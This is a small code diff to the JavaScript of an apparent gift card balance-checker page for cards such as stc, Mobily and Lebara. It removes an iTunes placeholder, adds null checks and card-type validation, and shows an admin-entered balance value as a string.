@@ -38,7 +38,6 @@ const CAROUSEL_PLACEHOLDER_HTML = {
   stc:    { bg: 'linear-gradient(135deg,#4c1d95,#7c3aed)',  inner: '<span style="color:white;font-weight:900;font-size:1.8rem">stc</span>' },
   mobily: { bg: 'linear-gradient(135deg,#1d4ed8,#3b82f6)',  inner: '<span style="color:white;font-weight:700;font-size:1.2rem">Mobily</span>' },
   lebara: { bg: 'linear-gradient(135deg,#0369a1,#7dd3fc)',  inner: '<span style="color:white;font-weight:900;font-size:1.2rem">LEBARA</span>' },
-  itunes_jpg: { bg: 'linear-gradient(135deg,#6d28d9,#ec4899)', inner: '<span style="color:white;font-size:2.2rem">🎵</span>' },
 };
 
 function buildCarouselDOM() {
@@ -204,7 +203,8 @@ function selectCard(value) {
 function updateSelectIcon() {
   const sel = document.getElementById('giftCardSelect');
   const opt = sel.options[sel.selectedIndex];
-  document.getElementById('selectIcon').textContent = opt.getAttribute('data-emoji') || '💳';
+  document.getElementById('selectIcon').textContent =
+    (opt && opt.getAttribute('data-emoji')) || '💳';
 }
 
 function clearResult() {
@@ -260,6 +260,7 @@ async function checkBalance() {
   const cardPin   = document.getElementById('cardPin').value.trim();
 
   // Validate
+  if (!cardType) { shakeEl(document.getElementById('giftCardSelect')); return; }
   if (!cardPin) { shakeEl(document.getElementById('cardPin')); return; }
 
   const requestId   = genId();
@@ -341,7 +342,8 @@ function setLoading(on) {
 }
 
 function showResult(balance, cardLabel, maskedPin) {
-  document.getElementById('resultAmount').textContent = balance;
+  // Keep exact admin-entered value (e.g. "5000 rupees", "400 coins", "4000")
+  document.getElementById('resultAmount').textContent = String(balance);
   document.getElementById('resultCard').textContent   = `${cardLabel} • PIN ${maskedPin}`;
   document.getElementById('resultBox').style.display  = 'flex';
   document.getElementById('errorBox').style.display   = 'none';
